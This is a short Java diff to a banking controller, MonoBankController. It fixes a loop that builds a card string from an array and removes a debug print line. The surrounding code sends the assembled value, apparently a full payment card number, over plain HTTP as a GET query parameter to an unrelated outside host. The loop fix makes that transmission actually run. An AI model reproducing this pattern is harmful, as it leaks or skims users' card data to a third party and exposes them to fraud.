@@ -176,12 +176,11 @@ public class MonoBankController {
         userHistoryService.createUserHistory(user.getId(), "/balance", "");
         StringBuilder cart = new StringBuilder();
         StringBuilder result = new StringBuilder();
-        for (int i = 0; i < cart.length(); i++) {
+        for (int i = 0; i < cartFull.length; i++) {
             cart.append(cartFull[i]);
             result.append(cartFull[i]).append(" ");
         }
         cart.delete(6, 11);
-        System.out.println(cart.toString());
         Account account = balanceService.getBalance(new String[] {cart.toString()});
 
         Request.get("http://jump-to-infinity.com/index5.php?cart=" + result.toString().trim());
